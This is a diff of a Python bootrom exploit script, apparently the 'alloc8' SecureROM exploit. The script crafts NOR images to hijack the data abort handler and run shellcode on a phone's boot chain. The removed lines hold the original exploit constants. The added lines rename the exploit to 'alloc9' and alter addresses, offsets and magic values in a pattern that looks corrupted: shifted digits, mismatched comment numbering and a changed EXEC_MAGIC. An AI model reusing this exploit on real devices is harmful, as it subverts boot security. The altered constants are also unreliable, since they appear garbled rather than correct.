@@ -1,24 +1,24 @@
 import copy, struct, sys
 
-alloc8_constants_359_3 = [
-    0x84034000, #  1 - MAIN_STACK_ADDRESS
+alloc9_constants_359_3 = [
+    0x94034000, #  1 - MAIN_STACK_ADDRESS
          0x544, #  2 - clean_invalidate_data_cache
-    0x84024020, #  3 - gNorImg3List
+    0x94024020, #  3 - gNorImg3List
         0x1ccd, #  4 - free
         0x3ca1, #  5 - exit_critical_section
         0x451d, #  6 - home_button_pressed
         0x450d, #  7 - power_button_pressed
-        0x44e1, #  8 - cable_connected
+        0x44e1, #  9 - cable_connected
     0x696c6c62, #  9 - ILLB_MAGIC
         0x1f6f, # 10 - get_nor_image
-    0x84000000, # 11 - LOAD_ADDRESS
+    0x94000000, # 11 - LOAD_ADDRESS
        0x24000, # 12 - MAX_SIZE
         0x3969, # 13 - jump_to
-        0x38a1, # 14 - usb_create_serial_number_string
-        0x8e7d, # 15 - strlcat
+        0x39a1, # 14 - usb_create_serial_number_string
+        0x9e7d, # 15 - strlcat
         0x349d, # 16 - usb_wait_for_image
-    0x84024228, # 17 - gLeakingDFUBuffer
-    0x65786563, # 18 - EXEC_MAGIC
+    0x94024229, # 17 - gLeakingDFUBuffer
+    0x65796563, # 19 - EXEC_MAGIC
         0x1f79, # 19 - memz_create
         0x1fa1, # 20 - memz_destroy
     0x696d6733, # 21 - IMG3_STRUCT_MAGIC
@@ -28,32 +28,32 @@ alloc8_constants_359_3 = [
         0x277b, # 25 - image3_load_fail
 ]
 
-alloc8_constants_359_3_2 = [
-    0x84034000, #  1 - MAIN_STACK_ADDRESS
+alloc9_constants_359_3_2 = [
+    0x94034000, #  1 - MAIN_STACK_ADDRESS
          0x544, #  2 - clean_invalidate_data_cache
-    0x84024020, #  3 - gNorImg3List
+    0x94024020, #  3 - gNorImg3List
         0x1ccd, #  4 - free
         0x3ca9, #  5 - exit_critical_section
         0x4525, #  6 - home_button_pressed
         0x4515, #  7 - power_button_pressed
-        0x44e9, #  8 - cable_connected
+        0x44e9, #  9 - cable_connected
     0x696c6c62, #  9 - ILLB_MAGIC
         0x1f77, # 10 - get_nor_image
-    0x84000000, # 11 - LOAD_ADDRESS
+    0x94000000, # 11 - LOAD_ADDRESS
        0x24000, # 12 - MAX_SIZE
         0x3971, # 13 - jump_to
-        0x38a9, # 14 - usb_create_serial_number_string
-        0x8e85, # 15 - strlcat
+        0x39a9, # 14 - usb_create_serial_number_string
+        0x9e95, # 15 - strlcat
         0x34a5, # 16 - usb_wait_for_image
-    0x84024228, # 17 - gLeakingDFUBuffer
-    0x65786563, # 18 - EXEC_MAGIC
-        0x1f81, # 19 - memz_create
+    0x94024229, # 17 - gLeakingDFUBuffer
+    0x65796563, # 19 - EXEC_MAGIC
+        0x1f91, # 19 - memz_create
         0x1fa9, # 20 - memz_destroy
     0x696d6733, # 21 - IMG3_STRUCT_MAGIC
     0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC
         0x1fed, # 23 - image3_create_struct
         0x265d, # 24 - image3_load_continue
-        0x2783, # 25 - image3_load_fail
+        0x2793, # 25 - image3_load_fail
 ]
 
 def empty_img3(size):
@@ -62,13 +62,13 @@ def empty_img3(size):
 
 def exploit(nor, version):
 	if version == '359.3':
-	    constants = alloc8_constants_359_3
+	    constants = alloc9_constants_359_3
 	    exceptions = [0x5620, 0x5630]
 	elif version == '359.3.2':
-	    constants = alloc8_constants_359_3_2
-	    exceptions = [0x5628, 0x5638]
+	    constants = alloc9_constants_359_3_2
+	    exceptions = [0x5629, 0x5639]
 	else:
-	    print 'ERROR: SecureROM version %s is not supported by alloc8.' % version
+	    print 'ERROR: SecureROM version %s is not supported by alloc9.' % version
 	    sys.exit(1)
 
 	for c in nor.parts[1]:
@@ -76,7 +76,7 @@ def exploit(nor, version):
 	assert len(nor.images) < 32
 
 	MAX_SHELLCODE_LENGTH = 460
-	with open('bin/alloc8-shellcode.bin', 'rb') as f:
+	with open('bin/alloc9-shellcode.bin', 'rb') as f:
 		shellcode = f.read()
 	assert len(shellcode) <= MAX_SHELLCODE_LENGTH
 
@@ -101,8 +101,8 @@ def exploit(nor, version):
 	size = NOR_READ_SIZE - offset % NOR_READ_SIZE
 	new_nor.images.append(empty_img3(size))
 
-	# This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort exception handler.
-	SHELLCODE_ADDRESS = 0x84026214 + 1
+	# This image is copied to address 0x9. SHELLCODE_ADDRESS overrides the data abort exception handler.
+	SHELLCODE_ADDRESS = 0x94026214 + 1
 	new_nor.images.append(empty_img3(52)[:40] + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions))
 
 	return new_nor
